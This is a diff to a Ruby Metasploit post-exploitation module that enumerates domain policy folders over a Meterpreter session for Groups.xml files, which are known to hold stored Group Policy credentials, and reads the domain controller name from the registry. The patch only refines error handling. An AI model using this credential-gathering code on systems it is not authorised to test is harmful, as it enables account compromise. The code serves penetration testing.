@@ -109,15 +109,20 @@ class Metasploit3 < Msf::Post
 				tpath = "#{path}#{sub}\\Policies\\"
 				print_status "Looking in domain folder #{tpath}"
 				# Enumerate policy folders {...}
-				session.fs.dir.foreach(tpath) do |sub2|
-					next if sub2 =~ /^(\.|\.\.)$/
-					tpath2 = "#{tpath}#{sub2}\\MACHINE\\Preferences\\Groups\\Groups.xml"
-					begin
-						paths << tpath2 if client.fs.file.stat(tpath2)
-					rescue
-						next
+				begin
+					session.fs.dir.foreach(tpath) do |sub2|
+						next if sub2 =~ /^(\.|\.\.)$/
+						tpath2 = "#{tpath}#{sub2}\\MACHINE\\Preferences\\Groups\\Groups.xml"
+						begin
+							paths << tpath2 if client.fs.file.stat(tpath2)
+						rescue Rex::Post::Meterpreter::RequestError => e
+							# No permissions for this specific file.
+							next
+						end
 					end
-				end
+				rescue Rex::Post::Meterpreter::RequestError => e
+					print_error "Received error code #{e.code} when reading #{tpath}"
+				end				
 			end
 		rescue Rex::Post::Meterpreter::RequestError => e
 			print_error "Received error code #{e.code} when reading #{path}"
@@ -135,8 +140,8 @@ class Metasploit3 < Msf::Post
 
 			domain = path.split('\\')[2]
 			return data, domain
-		rescue
-			print_status("The file #{path} either could not be read or does not exist")
+		rescue Rex::Post::Meterpreter::RequestError => e
+				print_error "Received error code #{e.code} when reading #{path}"
 		end
 	end
 
@@ -278,8 +283,8 @@ class Metasploit3 < Msf::Post
 			v = open_key.query_value(valname)
 			value = v.data
 			open_key.close
-		rescue
-			print_error e.message
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
 		end
 
 		return value
@@ -292,8 +297,8 @@ class Metasploit3 < Msf::Post
 			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
 			v_name = "DCName"
 			domain = reg_getvaldata(subkey, v_name)
-		rescue
-			print_error e.message 
+		rescue Rex::Post::Meterpreter::RequestError => e
+			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
 		end
 
 		if domain.nil?
